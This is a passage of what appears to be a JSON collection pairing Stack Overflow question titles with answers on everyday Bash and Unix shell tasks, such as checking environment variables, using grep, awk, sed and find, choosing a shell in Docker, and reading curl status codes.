    "How to check if an environment variable exists and get its value? [duplicate]": "[ -z \"${DEPLOY_ENV}\" ] checks whether DEPLOY_ENV has length equal to zero. So you could run:\nif [[ -z \"${DEPLOY_ENV}\" ]]; then\n  MY_SCRIPT_VARIABLE=\"Some default value because DEPLOY_ENV is undefined\"\nelse\n  MY_SCRIPT_VARIABLE=\"${DEPLOY_ENV}\"\nfi\n\n# or using a short-hand version\n\n[[ -z \"${DEPLOY_ENV}\" ]] && MyVar='default' || MyVar=\"${DEPLOY_ENV}\"\n\n# or even shorter use\n\nMyVar=\"${DEPLOY_ENV:-default_value}\"",
    "OS X Terminal Colors [closed]": "Here is a solution I've found to enable the global terminal colors.\nEdit your .bash_profile (since OS X 10.8) \u2014 or (for 10.7 and earlier): .profile or .bashrc or /etc/profile (depending on availability) \u2014 in your home directory and add following code:\nexport CLICOLOR=1\nexport LSCOLORS=GxFxCxDxBxegedabagaced\nCLICOLOR=1 simply enables coloring of your terminal.\nLSCOLORS=... specifies how to color specific items.\nAfter editing .bash_profile, start a Terminal and force the changes to take place by executing:\nsource ~/.bash_profile\nThen go to Terminal > Preferences, click on the Profiles tab and then the Text subtab and check Display ANSI Colors.\nVerified on Sierra (May 2017).",
    "How can I kill a process by name instead of PID, on Linux? [duplicate]": "pkill firefox\nMore information: http://linux.about.com/library/cmd/blcmdl1_pkill.htm",
    "Pipe output and capture exit status in Bash": "There is an internal Bash variable called $PIPESTATUS; it\u2019s an array that holds the exit status of each command in your last foreground pipeline of commands.\n<command> | tee out.txt ; test ${PIPESTATUS[0]} -eq 0\nOr another alternative which also works with other shells (like zsh) would be to enable pipefail:\nset -o pipefail\n...\nThe first option does not work with zsh due to a little bit different syntax.",
    "How can I assign a name for a screen? [closed]": "To start a new session\nscreen -S your_session_name\nTo rename an existing session\nCtrl+a, : sessionname $YOUR_SESSION_NAME Enter\nYou must be inside the session\nsessionname is command, please type it exactly, not your session name there - yours will be at $YOUR_SESSION_NAME",
    "Running multiple commands in one line in shell": "You are using | (pipe) to direct the output of a command into another command. What you are looking for is && operator to execute the next command only if the previous one succeeded:\ncp /templates/apple /templates/used && cp /templates/apple /templates/inuse && rm /templates/apple\nOr\ncp /templates/apple /templates/used && mv /templates/apple /templates/inuse\nTo summarize (non-exhaustively) bash's command operators/separators:\n| pipes (pipelines) the standard output (stdout) of one command into the standard input of another one. Note that stderr still goes into its default destination, whatever that happen to be.\n|&pipes both stdout and stderr of one command into the standard input of another one. Very useful, available in bash version 4 and above.\n&& executes the right-hand command of && only if the previous one succeeded.\n|| executes the right-hand command of || only it the previous one failed.\n; executes the right-hand command of ; always regardless whether the previous command succeeded or failed. Unless set -e was previously invoked, which causes bash to fail on an error.\n& executes the left-hand command as a background job, and also concurrently runs the right-hand command (which can also be terminated with & to run as a background job).",
    "Capturing Groups From a Grep RegEx": "If you're using Bash, you don't even have to use grep:\nfiles=\"*.jpg\"\nregex=\"[0-9]+_([a-z]+)_[0-9a-z]*\" # put the regex in a variable because some patterns won't work if included literally\nfor f in $files    # unquoted in order to allow the glob to expand\ndo\n    if [[ $f =~ $regex ]]\n    then\n        name=\"${BASH_REMATCH[1]}\"\n        echo \"${name}.jpg\"    # concatenate strings\n        name=\"${name}.jpg\"    # same thing stored in a variable\n    else\n        echo \"$f doesn't match\" >&2 # this could get noisy if there are a lot of non-matching files\n    fi\ndone\nIt's better to put the regex in a variable. Some patterns won't work if included literally.\nThis uses =~ which is Bash's regex match operator. The results of the match are saved to an array called $BASH_REMATCH. The first capture group is stored in index 1, the second (if any) in index 2, etc. Index zero is the full match.\nside note #1 regarding regex anchors:\nYou should be aware that without anchors, this regex (and the one using grep) will match any of the following examples and more, which may not be what you're looking for:\n123_abc_d4e5\nxyz123_abc_d4e5\n123_abc_d4e5.xyz\nxyz123_abc_d4e5.xyz\nTo eliminate the second and fourth examples, make your regex like this:\n^[0-9]+_([a-z]+)_[0-9a-z]*\nwhich says the string must start with one or more digits. The carat represents the beginning of the string. If you add a dollar sign at the end of the regex, like this:\n^[0-9]+_([a-z]+)_[0-9a-z]*$\nthen the third example will also be eliminated since the dot is not among the characters in the regex and the dollar sign represents the end of the string. Note that the fourth example fails this match as well.\nside note #2 regarding grep and the \\K operator:\nIf you have GNU grep (around 2.5 or later, I think, when the \\K operator was added):\nname=$(echo \"$f\" | grep -Po '(?i)[0-9]+_\\K[a-z]+(?=_[0-9a-z]*)').jpg\nThe \\K operator (variable-length look-behind) causes the preceding pattern to match, but doesn't include the match in the result. The fixed-length equivalent is (?<=) - the pattern would be included before the closing parenthesis. You must use \\K if quantifiers may match strings of different lengths (e.g. +, *, {2,4}).\nThe (?=) operator matches fixed or variable-length patterns and is called \"look-ahead\". It also does not include the matched string in the result.\nIn order to make the match case-insensitive, the (?i) operator is used. It affects the patterns that follow it so its position is significant.\nThe regex might need to be adjusted depending on whether there are other characters in the filename. You'll note that in this case, I show an example of concatenating a string at the same time that the substring is captured.",
    "What's a concise way to check that environment variables are set in a Unix shell script?": "Parameter Expansion\nThe obvious answer is to use one of the special forms of parameter expansion:\n: ${STATE?\"Need to set STATE\"}\n: ${DEST:?\"Need to set DEST non-empty\"}\nOr, better (see section on 'Position of double quotes' below):\n: \"${STATE?Need to set STATE}\"\n: \"${DEST:?Need to set DEST non-empty}\"\nThe first variant (using just ?) requires STATE to be set, but STATE=\"\" (an empty string) is OK \u2014 not exactly what you want, but the alternative and older notation.\nThe second variant (using :?) requires DEST to be set and non-empty.\nIf you supply no message, the shell provides a default message.\nThe ${var?} construct is portable back to Version 7 UNIX and the Bourne Shell (1978 or thereabouts). The ${var:?} construct is slightly more recent: I think it was in System III UNIX circa 1981, but it may have been in PWB UNIX before that. It is therefore in the Korn Shell, and in the POSIX shells, including specifically Bash.\nIt is usually documented in the shell's man page in a section called Parameter Expansion. For example, the bash manual says:\n${parameter:?word}\nDisplay Error if Null or Unset. If parameter is null or unset, the expansion of word (or a message to that effect if word is not present) is written to the standard error and the shell, if it is not interactive, exits. Otherwise, the value of parameter is substituted.\nThe Colon Command\nI should probably add that the colon command simply has its arguments evaluated and then succeeds. It is the original shell comment notation (before '#' to end of line). For a long time, Bourne shell scripts had a colon as the first character. The C Shell would read a script and use the first character to determine whether it was for the C Shell (a '#' hash) or the Bourne shell (a ':' colon). Then the kernel got in on the act and added support for '#!/path/to/program' and the Bourne shell got '#' comments, and the colon convention went by the wayside. But if you come across a script that starts with a colon, now you will know why.\nPosition of double quotes\nblong asked in a comment:\nAny thoughts on this discussion? https://github.com/koalaman/shellcheck/issues/380#issuecomment-145872749\nThe gist of the discussion is:\n\u2026 However, when I shellcheck it (with version 0.4.1), I get this message:\nIn script.sh line 13:\n: ${FOO:?\"The environment variable 'FOO' must be set and non-empty\"}\n  ^-- SC2086: Double quote to prevent globbing and word splitting.\nAny advice on what I should do in this case?\nThe short answer is \"do as shellcheck suggests\":\n: \"${STATE?Need to set STATE}\"\n: \"${DEST:?Need to set DEST non-empty}\"\nTo illustrate why, study the following. Note that the : command doesn't echo its arguments (but the shell does evaluate the arguments). We want to see the arguments, so the code below uses printf \"%s\\n\" in place of :.\n$ mkdir junk\n$ cd junk\n$ > abc\n$ > def\n$ > ghi\n$ \n$ x=\"*\"\n$ printf \"%s\\n\" ${x:?You must set x}    # Careless; not recommended\nabc\ndef\nghi\n$ unset x\n$ printf \"%s\\n\" ${x:?You must set x}    # Careless; not recommended\nbash: x: You must set x\n$ printf \"%s\\n\" \"${x:?You must set x}\"  # Careful: should be used\nbash: x: You must set x\n$ x=\"*\"\n$ printf \"%s\\n\" \"${x:?You must set x}\"  # Careful: should be used\n*\n$ printf \"%s\\n\" ${x:?\"You must set x\"}  # Not quite careful enough\nabc\ndef\nghi\n$ x=\n$ printf \"%s\\n\" ${x:?\"You must set x\"}  # Not quite careful enough\nbash: x: You must set x\n$ unset x\n$ printf \"%s\\n\" ${x:?\"You must set x\"}  # Not quite careful enough\nbash: x: You must set x\n$ \nNote how the value in $x is expanded to first * and then a list of file names when the overall expression is not in double quotes. This is what shellcheck is recommending should be fixed. I have not verified that it doesn't object to the form where the expression is enclosed in double quotes, but it is a reasonable assumption that it would be OK.",
    "How to append one file to another in Linux from the shell?": "Use bash builtin redirection (tldp):\ncat file2 >> file1",
    "How to generate random number in Bash?": "Use $RANDOM. It's often useful in combination with simple shell arithmetic. For instance, to generate a random number between 1 and 10 (inclusive):\n$ echo $((1 + $RANDOM % 10))\n3\nThe actual generator is in variables.c, the function brand(). Older versions were a simple linear generator. Version 4.0 of bash uses a generator with a citation to a 1988 paper, which presumably means it's a decent source of pseudorandom numbers. I wouldn't use it for a simulation (and certainly not for crypto), but it's probably adequate for basic scripting tasks.\nIf you're doing something that requires serious random numbers you can use /dev/random or /dev/urandom if they're available:\n$ dd if=/dev/urandom count=4 bs=1 | od -t d",
    "Get just the filename from a path in a Bash script [duplicate]": "Many UNIX-like operating systems have a basename executable for a very similar purpose (and dirname for the path):\npax> full_name=/tmp/file.txt\npax> base_name=$(basename ${full_name})\npax> echo ${base_name}\nfile.txt\nThat unfortunately just gives you the file name, including the extension, so you'd need to find a way to strip that off as well.\nSo, given you have to do that anyway, you may as well find a method that can strip off the path and the extension.\nOne way to do that (and this is a bash-only solution, needing no other executables):\npax> full_name=/tmp/xx/file.tar.gz\npax> xpath=${full_name%/*} \npax> xbase=${full_name##*/}\npax> xfext=${xbase##*.}\npax> xpref=${xbase%.*}\npax> echo \"path='${xpath}', pref='${xpref}', ext='${xfext}'\"\n\npath='/tmp/xx', pref='file.tar', ext='gz'\nThat little snippet sets xpath (the file path), xpref (the file prefix, what you were specifically asking for) and xfext (the file extension).",
    "Check folder size in Bash": "You can do:\ndu -hs your_directory\nwhich will give you a brief output of the size of your target directory. Using a wildcard like * can select multiple directories.\nIf you want a full listing of sizes for all files and sub-directories inside your target, you can do:\ndu -h your_directory\nTips:\nAdd the argument -c to see a Total line at the end. Example: du -hcs or du -hc.\nRemove the argument -h to see the sizes in exact KiB instead of human-readable MiB or GiB formats. Example: du -s or du -cs.",
    "Pseudo-terminal will not be allocated because stdin is not a terminal": "Try ssh -t -t(or ssh -tt for short) to force pseudo-tty allocation even if stdin isn't a terminal.\nSee also: Terminating SSH session executed by bash script\nFrom ssh manpage:\n-T      Disable pseudo-tty allocation.\n\n-t      Force pseudo-tty allocation.  This can be used to execute arbitrary \n        screen-based programs on a remote machine, which can be very useful,\n        e.g. when implementing menu services.  Multiple -t options force tty\n        allocation, even if ssh has no local tty.",
    "How to execute mongo commands through shell scripts?": "You can also evaluate a command using the --eval flag, if it is just a single command.\nmongo --eval \"printjson(db.serverStatus())\"\nPlease note: if you are using Mongo operators, starting with a $ sign, you'll want to surround the eval argument in single quotes to keep the shell from evaluating the operator as an environment variable:\nmongo --eval 'db.mycollection.update({\"name\":\"foo\"},{$set:{\"this\":\"that\"}});' myDbName\nOtherwise you may see something like this:\nmongo --eval \"db.test.update({\\\"name\\\":\\\"foo\\\"},{$set:{\\\"this\\\":\\\"that\\\"}});\"\n> E QUERY    SyntaxError: Unexpected token :",
    "Going to a specific line number using Less in Unix": "With n being the line number:\nng: Jump to line number n. Default is the start of the file.\nnG: Jump to line number n. Default is the end of the file.\nSo to go to line number 320123, you would type 320123g.\nCopy-pasted straight from Wikipedia.",
    "How to pass in password to pg_dump?": "Create a .pgpass file in the home directory of the account that pg_dump will run as.\nThe format is:\nhostname:port:database:username:password\nThen, set the file's mode to 0600. Otherwise, it will be ignored.\nchmod 600 ~/.pgpass\nSee the Postgresql documentation libpq-pgpass for more details.",
    "What is the purpose of \"&&\" in a shell command?": "Furthermore, you also have || which is the logical or, and also ; which is just a separator which doesn't care what happend to the command before.\n$ false || echo \"Oops, fail\"\nOops, fail\n\n$ true || echo \"Will not be printed\"\n$  \n\n$ true && echo \"Things went well\"\nThings went well\n\n$ false && echo \"Will not be printed\"\n$\n\n$ false ; echo \"This will always run\"\nThis will always run\nSome details about this can be found here Lists of Commands in the Bash Manual.",
    "Can I export a variable to the environment from a Bash script without sourcing it?": "Is there any way to access to the $VAR by just executing export.bash without sourcing it ?\nQuick answer: No.\nBut there are several possible workarounds.\nThe most obvious one, which you've already mentioned, is to use source or . to execute the script in the context of the calling shell:\n$ cat set-vars1.sh \nexport FOO=BAR\n$ . set-vars1.sh \n$ echo $FOO\nBAR\nAnother way is to have the script, rather than setting an environment variable, print commands that will set the environment variable:\n$ cat set-vars2.sh\n#!/bin/bash\necho export FOO=BAR\n$ eval \"$(./set-vars2.sh)\"\n$ echo \"$FOO\"\nBAR\nA third approach is to have a script that sets your environment variable(s) internally and then invokes a specified command with that environment:\n$ cat set-vars3.sh\n#!/bin/bash\nexport FOO=BAR\nexec \"$@\"\n$ ./set-vars3.sh printenv | grep FOO\nFOO=BAR\nThis last approach can be quite useful, though it's inconvenient for interactive use since it doesn't give you the settings in your current shell (with all the other settings and history you've built up).",
    "Shell script - remove first and last quote (\") from a variable": "Use tr to delete \":\n echo \"$opt\" | tr -d '\"'\nNOTE: This does not fully answer the question, removes all double quotes, not just leading and trailing. See other answers below.",
    "What does `set -x` do?": "set -x enables a shell mode where all executed commands are printed to the terminal.\nIn your case it's used for debugging, which is a typical use case for set -x: printing every command as it is executed may help you visualize the script's control flow if it is not functioning as expected.\nset +x disables it.",
    "What is the purpose of the : (colon) GNU Bash builtin?": "Historically, Bourne shells didn't have true and false as built-in commands. true was instead simply aliased to :, and false to something like let 0.\n: is slightly better than true for portability to ancient Bourne-derived shells. As a simple example, consider having neither the ! pipeline operator nor the || list operator (as was the case for some ancient Bourne shells). This leaves the else clause of the if statement as the only means for branching based on exit status:\nif command; then :; else ...; fi\nSince if requires a non-empty then clause and comments don't count as non-empty, : serves as a no-op.\nNowadays (that is: in a modern context) you can usually use either : or true. Both are specified by POSIX, and some find true easier to read. However there is one interesting difference: : is a so-called POSIX special built-in, whereas true is a regular built-in.\nSpecial built-ins are required to be built into the shell; Regular built-ins are only \"typically\" built in, but it isn't strictly guaranteed. There usually shouldn't be a regular program named : with the function of true in PATH of most systems.\nProbably the most crucial difference is that with special built-ins, any variable set by the built-in - even in the environment during simple command evaluation - persists after the command completes, as demonstrated here using ksh93:\n$ unset x; ( x=hi :; echo \"$x\" )\nhi\n$ ( x=hi true; echo \"$x\" )\n\n$\nNote that Zsh ignores this requirement, as does GNU Bash except when operating in POSIX compatibility mode, but all other major \"POSIX sh derived\" shells observe this including dash, ksh93, and mksh.\nAnother difference is that regular built-ins must be compatible with exec - demonstrated here using Bash:\n$ ( exec : )\n-bash: exec: :: not found\n$ ( exec true )\n$\nPOSIX also explicitly notes that : may be faster than true, though this is of course an implementation-specific detail.",
    "How to check if running in Cygwin, Mac or Linux?": "Usually, uname with its various options will tell you what environment you're running in:\npax> uname -a\nCYGWIN_NT-5.1 IBM-L3F3936 1.5.25(0.156/4/2) 2008-06-12 19:34 i686 Cygwin\n\npax> uname -s\nCYGWIN_NT-5.1\nAnd, according to the very helpful schot (in the comments), uname -s gives Darwin for OSX and Linux for Linux, while my Cygwin gives CYGWIN_NT-5.1. But you may have to experiment with all sorts of different versions.\nSo the bash code to do such a check would be along the lines of:\nunameOut=\"$(uname -s)\"\ncase \"${unameOut}\" in\n    Linux*)     machine=Linux;;\n    Darwin*)    machine=Mac;;\n    CYGWIN*)    machine=Cygwin;;\n    MINGW*)     machine=MinGw;;\n    MSYS_NT*)   machine=MSys;;\n    *)          machine=\"UNKNOWN:${unameOut}\"\nesac\necho ${machine}\nNote that I'm assuming here that you're actually running within CygWin (the bash shell of it) so paths should already be correctly set up. As one commenter notes, you can run the bash program, passing the script, from cmd itself and this may result in the paths not being set up as needed.\nIf you are doing that, it's your responsibility to ensure the correct executables (i.e., the CygWin ones) are being called, possibly by modifying the path beforehand or fully specifying the executable locations (e.g., /c/cygwin/bin/uname).",
    "How to determine whether a given Linux is 32 bit or 64 bit?": "Try uname -m. Which is short of uname --machine and it outputs:\nx86_64 ==> 64-bit kernel\ni686   ==> 32-bit kernel\nOtherwise, not for the Linux kernel, but for the CPU, you type:\ncat /proc/cpuinfo\nor:\ngrep flags /proc/cpuinfo\nUnder \"flags\" parameter, you will see various values: see \"What do the flags in /proc/cpuinfo mean?\" Among them, one is named lm: Long Mode (x86-64: amd64, also known as Intel 64, i.e. 64-bit capable)\nlm ==> 64-bit processor\nOr using lshw (as mentioned below by Rolf of Saxony), without sudo (just for grepping the cpu width):\nlshw -class cpu|grep \"^       width\"|uniq|awk '{print $2}'\nNote: you can have a 64-bit CPU with a 32-bit kernel installed.\n(as ysdx mentions in his/her own answer, \"Nowadays, a system can be multiarch so it does not make sense anyway. You might want to find the default target of the compiler\")",
    "How to create a link to a directory on linux [closed]": "Symbolic or soft link (files or directories, more flexible and self documenting)\n#     Source                             Link\nln -s /home/jake/doc/test/2000/something /home/jake/xxx\nHard link (files only, less flexible and not self documenting)\n#   Source                             Link\nln /home/jake/doc/test/2000/something /home/jake/xxx\nMore information: man ln\n-----\n/home/jake/xxx is like a new directory. To avoid \"is not a directory: No such file or directory\" error, as @trlkly comment, use relative path in the target, that is, using the example:\ncd /home/jake/\nln -s /home/jake/doc/test/2000/something  xxx",
    "Using the RUN instruction in a Dockerfile with 'source' does not work": "Original Answer\nFROM ubuntu:14.04\nRUN rm /bin/sh && ln -s /bin/bash /bin/sh\nThis should work for every Ubuntu docker base image. I generally add this line for every Dockerfile I write.\nEdit by a concerned bystander\nIf you want to get the effect of \"use bash instead of sh throughout this entire Dockerfile\", without altering and possibly damaging* the OS inside the container, you can just tell Docker your intention. That is done like so:\nSHELL [\"/bin/bash\", \"-c\"]\n* The possible damage is that many scripts in Linux (on a fresh Ubuntu install grep -rHInE '/bin/sh' / returns over 2700 results) expect a fully POSIX shell at /bin/sh. The bash shell isn't just POSIX plus extra builtins. There are builtins (and more) that behave entirely different than those in POSIX. I FULLY support avoiding POSIX (and the fallacy that any script that you didn't test on another shell is going to work because you think you avoided basmisms) and just using bashism. But you do that with a proper shebang in your script. Not by pulling the POSIX shell out from under the entire OS. (Unless you have time to verify all 2700 plus scripts that come with Linux plus all those in any packages you install.)\nMore detail in this answer below. https://stackoverflow.com/a/45087082/117471",
    "How to check if running as root in a bash script": "The $EUID environment variable holds the current user's UID. Root's UID is 0. Use something like this in your script:\nif [ \"$EUID\" -ne 0 ]\n  then echo \"Please run as root\"\n  exit\nfi\nNote: If you get 2: [: Illegal number: check if you have #!/bin/sh at the top and change it to #!/bin/bash.",
    "Way to create multiline comments in Bash?": "Use : ' to open and ' to close.\nFor example:\n: '\nThis is a\nvery neat comment\nin bash\n'",
    "Get line number while using grep": "grep -n SEARCHTERM file1 file2 ...",
    "How to save a Python interactive session?": "IPython is extremely useful if you like using interactive sessions. For example for your use-case there is the %save magic command, you just input %save my_useful_session 10-20 23 to save input lines 10 to 20 and 23 to my_useful_session.py (to help with this, every line is prefixed by its number).\nFurthermore, the documentation states:\nThis function uses the same syntax as %history for input ranges, then saves the lines to the filename you specify.\nThis allows for example, to reference older sessions, such as\n%save current_session ~0/\n%save previous_session ~1/\nLook at the videos on the presentation page to get a quick overview of the features.",
    "Docker: How to use bash with an Alpine based docker image?": "Alpine docker image doesn't have bash installed by default. You will need to add the following commands to get bash:\nRUN apk update && apk add bash\nIf you're using Alpine 3.3+ then you can just do:\nRUN apk add --no-cache bash\nTo keep the docker image size small. (Thanks to comment from @sprkysnrky)\nIf you just want to connect to the container and don't need bash, you can use:\ndocker run --rm -i -t alpine /bin/sh --login",
    "What's the best way to send a signal to all members of a process group?": "You don't say if the tree you want to kill is a single process group. (This is often the case if the tree is the result of forking from a server start or a shell command line.) You can discover process groups using GNU ps as follows:\n ps x -o  \"%p %r %y %x %c \"\nIf it is a process group you want to kill, just use the kill(1) command but instead of giving it a process number, give it the negation of the group number. For example to kill every process in group 5112, use kill -TERM -- -5112.",
    "Using awk to print all columns from the nth to the last": "Print all columns:\nawk '{print $0}' somefile\nPrint all but the first column:\nawk '{$1=\"\"; print $0}' somefile\nPrint all but the first two columns:\nawk '{$1=$2=\"\"; print $0}' somefile",
    "Get program execution time in the shell": "Use the built-in time keyword:\n$ help time\n\ntime: time [-p] PIPELINE\n    Execute PIPELINE and print a summary of the real time, user CPU time,\n    and system CPU time spent executing PIPELINE when it terminates.\n    The return status is the return status of PIPELINE.  The `-p' option\n    prints the timing summary in a slightly different format.  This uses\n    the value of the TIMEFORMAT variable as the output format.\nExample:\n$ time sleep 2\nreal    0m2.009s\nuser    0m0.000s\nsys     0m0.004s",
    "Replace whole line containing a string using Sed": "You can use the change command to replace the entire line, and the -i flag to make the changes in-place. For example, using GNU sed:\nsed -i '/TEXT_TO_BE_REPLACED/c\\This line is removed by the admin.' /tmp/foo",
    "Linux command to get time in milliseconds": "date +\"%T.%N\" returns the current time with nanoseconds.\n06:46:41.431857000\ndate +\"%T.%6N\" returns the current time with nanoseconds rounded to the first 6 digits, which is microseconds.\n06:47:07.183172\ndate +\"%T.%3N\" returns the current time with nanoseconds rounded to the first 3 digits, which is milliseconds.\n06:47:42.773\nIn general, every field of the date command's format can be given an optional field width.",
    "Concatenating multiple text files into a single file in Bash": "This appends the output to all.txt\ncat *.txt >> all.txt\nThis overwrites all.txt\ncat *.txt > all.txt",
    "./configure : /bin/sh^M : bad interpreter [duplicate]": "To fix, open your script with vi or vim and enter in vi command mode (key Esc), then type this:\n:set fileformat=unix\nFinally save it\n:x! or :wq!",
    "Using find to locate files that match one of multiple patterns": "Use -o, which means \"or\":\nfind Documents \\( -name \"*.py\" -o -name \"*.html\" \\)\nYou'd need to build that command line programmatically, which isn't that easy.\nAre you using bash (or Cygwin on Windows)? If you are, you should be able to do this:\nls **/*.py **/*.html\nwhich might be easier to build programmatically.",
    "Can pm2 run an 'npm start' script": "PM2 now supports npm start:\npm2 start npm -- start\nTo assign a name to the PM2 process, use the --name option:\npm2 start npm --name \"app name\" -- start",
    "How can I find encoding of a file via a script on Linux?": "It sounds like you're looking for enca. It can guess and even convert between encodings. Just look at the man page.\nOr, failing that, use file -i (Linux) or file -I (OS X). That will output MIME-type information for the file, which will also include the character-set encoding. I found a man-page for it, too :)",
    "Diff files present in two different directories": "You can use the diff command for that:\ndiff -bur folder1/ folder2/\nThis will output a recursive diff that ignore spaces, with a unified context:\nb flag means ignoring whitespace\nu flag means a unified context (3 lines before and after)\nr flag means recursive",
    "Make xargs handle filenames that contain spaces": "The xargs command takes white space characters (tabs, spaces, new lines) as delimiters.\nYou can narrow it down only for the new line characters ('\\n') with -d option like this:\nls *.mp3 | xargs -d '\\n' mplayer\nIt works only with GNU xargs.\nFor MacOS:\nls *.mp3 | tr \\\\n \\\\0 | xargs -0 mplayer\nThe more simplistic and practically useful approach (when don't need to process the filenames further):\nmplayer *.mp3",
    "How to check if a file contains a specific string using Bash": "if grep -q SomeString \"$File\"; then\n  Some Actions # SomeString was found\nfi\nYou don't need [[ ]] here. Just run the command directly. Add -q option when you don't need the string displayed when it was found.\nThe grep command returns 0 or 1 in the exit code depending on the result of search. 0 if something was found; 1 otherwise.\n$ echo hello | grep hi ; echo $?\n1\n$ echo hello | grep he ; echo $?\nhello\n0\n$ echo hello | grep -q he ; echo $?\n0\nYou can specify commands as an condition of if. If the command returns 0 in its exitcode that means that the condition is true; otherwise false.\n$ if /bin/true; then echo that is true; fi\nthat is true\n$ if /bin/false; then echo that is true; fi\n$\nAs you can see you run here the programs directly. No additional [] or [[]].",
    "How do I run a program with a different working directory from current, from Linux shell?": "Call the program like this:\n(cd /c; /a/helloworld)\nThe parentheses cause a sub-shell to be spawned. This sub-shell then changes its working directory to /c, then executes helloworld from /a. After the program exits, the sub-shell terminates, returning you to your prompt of the parent shell, in the directory you started from.\nError handling: To avoid running the program without having changed the directory, e.g. when having misspelled /c, make the execution of helloworld conditional:\n(cd /c && /a/helloworld)\nReducing memory usage: To avoid having the subshell waste memory while hello world executes, call helloworld via exec:\n(cd /c && exec /a/helloworld)\n[Thanks to Josh and Juliano for giving tips on improving this answer!]",
    "What is /dev/null 2>&1? [duplicate]": ">> /dev/null redirects standard output (stdout) to /dev/null, which discards it.\n(The >> seems sort of superfluous, since >> means append while > means truncate and write, and either appending to or writing to /dev/null has the same net effect. I usually just use > for that reason.)\n2>&1 redirects standard error (2) to standard output (1), which then discards it as well since standard output has already been redirected.",
    "'\\r': command not found - .bashrc / .bash_profile [duplicate]": "For those who don't have dos2unix installed (and don't want to install it):\nRemove trailing \\r character that causes this error:\nsed -i 's/\\r$//' filename\n\nExplanation:\nOption -i is for in-place editing, we delete the trailing \\r directly in the input file. Thus be careful to type the pattern correctly.",
    "How to perform grep operation on all files in a directory?": "In Linux, I normally use this command to recursively grep for a particular text within a directory:\ngrep -rni \"string\" *\nwhere\nr = recursive i.e, search subdirectories within the current directory\nn = to print the line numbers to stdout\ni = case insensitive search",
    "How to represent multiple conditions in a shell if statement?": "Classic technique (escape metacharacters):\nif [ \\( \"$g\" -eq 1 -a \"$c\" = \"123\" \\) -o \\( \"$g\" -eq 2 -a \"$c\" = \"456\" \\) ]\nthen echo abc\nelse echo efg\nfi\nI've enclosed the references to $g in double quotes; that's good practice, in general. Strictly, the parentheses aren't needed because the precedence of -a and -o makes it correct even without them.\nNote that the -a and -o operators are part of the POSIX specification for test, aka [, mainly for backwards compatibility (since they were a part of test in 7th Edition UNIX, for example), but they are explicitly marked as 'obsolescent' by POSIX. Bash (see conditional expressions) seems to preempt the classic and POSIX meanings for -a and -o with its own alternative operators that take arguments.\nWith some care, you can use the more modern [[ operator, but be aware that the versions in Bash and Korn Shell (for example) need not be identical.\nfor g in 1 2 3\ndo\n    for c in 123 456 789\n    do\n        if [[ ( \"$g\" -eq 1 && \"$c\" = \"123\" ) || ( \"$g\" -eq 2 && \"$c\" = \"456\" ) ]]\n        then echo \"g = $g; c = $c; true\"\n        else echo \"g = $g; c = $c; false\"\n        fi\n    done\ndone\nExample run, using Bash 3.2.57 on Mac OS X:\ng = 1; c = 123; true\ng = 1; c = 456; false\ng = 1; c = 789; false\ng = 2; c = 123; false\ng = 2; c = 456; true\ng = 2; c = 789; false\ng = 3; c = 123; false\ng = 3; c = 456; false\ng = 3; c = 789; false\nYou don't need to quote the variables in [[ as you do with [ because it is not a separate command in the same way that [ is.\nIsn't it a classic question?\nI would have thought so. However, there is another alternative, namely:\nif [ \"$g\" -eq 1 -a \"$c\" = \"123\" ] || [ \"$g\" -eq 2 -a \"$c\" = \"456\" ]\nthen echo abc\nelse echo efg\nfi\nIndeed, if you read the 'portable shell' guidelines for the autoconf tool or related packages, this notation \u2014 using '||' and '&&' \u2014 is what they recommend. I suppose you could even go so far as:\nif [ \"$g\" -eq 1 ] && [ \"$c\" = \"123\" ]\nthen echo abc\nelif [ \"$g\" -eq 2 ] && [ \"$c\" = \"456\" ]\nthen echo abc\nelse echo efg\nfi\nWhere the actions are as trivial as echoing, this isn't bad. When the action block to be repeated is multiple lines, the repetition is too painful and one of the earlier versions is preferable \u2014 or you need to wrap the actions into a function that is invoked in the different then blocks.",
    "Check if a file exists with a wildcard in a shell script [duplicate]": "For Bash scripts, the most direct and performant approach is:\nif compgen -G \"${PROJECT_DIR}/*.png\" > /dev/null; then\n    echo \"pattern exists!\"\nfi\nThis will work very speedily even in directories with millions of files and does not involve a new subshell.\nSource\nThe simplest should be to rely on ls return value (it returns non-zero when the files do not exist):\nif ls /path/to/your/files* 1> /dev/null 2>&1; then\n    echo \"files do exist\"\nelse\n    echo \"files do not exist\"\nfi\nI redirected the ls output to make it completely silent.\nHere is an optimization that also relies on glob expansion, but avoids the use of ls:\nfor f in /path/to/your/files*; do\n\n    ## Check if the glob gets expanded to existing files.\n    ## If not, f here will be exactly the pattern above\n    ## and the exists test will evaluate to false.\n    [ -e \"$f\" ] && echo \"files do exist\" || echo \"files do not exist\"\n\n    ## This is all we needed to know, so we can break after the first iteration\n    break\ndone\nThis is very similar to grok12's answer, but it avoids the unnecessary iteration through the whole list.",
    "Curl to return http status code along with the response": "I was able to get a solution by looking at the curl doc which specifies to use - for the output to get the output to stdout.\ncurl -o - -I http://localhost\nTo get the response with just the http return code, I could just do\ncurl -o /dev/null -s -w \"%{http_code}\\n\" http://localhost",
    "PHP shell_exec() vs exec()": "",
    "How to run a command with a timeout so that it is killed if it exceeds the timeout threshold?": "You are probably looking for the timeout command in coreutils. Since it's a part of coreutils, it is technically a C solution, but it's still coreutils. info timeout for more details. Here's an example:\ntimeout 5 /path/to/slow/command with options",
    "How do I use shell variables in an awk script?": "#Getting shell variables into awk may be done in several ways. Some are better than others. This should cover most of them. If you have a comment, please leave below.                                                                                    v1.5\nUsing -v (The best way, most portable)\nUse the -v option: (P.S. use a space after -v or it will be less portable. E.g., awk -v var= not awk -vvar=)\nvariable=\"line one\\nline two\"\nawk -v var=\"$variable\" 'BEGIN {print var}'\nline one\nline two\nThis should be compatible with most awk, and the variable is available in the BEGIN block as well:\nIf you have multiple variables:\nawk -v a=\"$var1\" -v b=\"$var2\" 'BEGIN {print a,b}'\nWarning. As Ed Morton writes and as seen in the above example, the shell variable is expanded by the shell before awk then sees its content as awk -v var='line one\\nline two' and so any escape sequences in the content of that shell variable will be interpreted when using -v, just like they are for every other form of assignment of a string to a variable in awk, e.g. awk 'BEGIN{var=\"line one\\nline two\"} {...}' or awk '{...}' var='line one\\nline two', and so \\n becomes a literal LineFeed character and not the 2-character string \\n. For example, given a variable like:\n$ variable='a\\tb\\n$c\\kd'\nawk would expand the escape sequences in the assignment:\n$ awk -v var=\"$variable\" 'BEGIN{ printf \"%s\\n\", var }'\nawk: warning: escape sequence `\\k' treated as plain `k'\na       b\n$ckd\nIf that's not what you want then, if your shell (e.g. bash) and locale (e.g. LC_ALL=C) support it then you can have 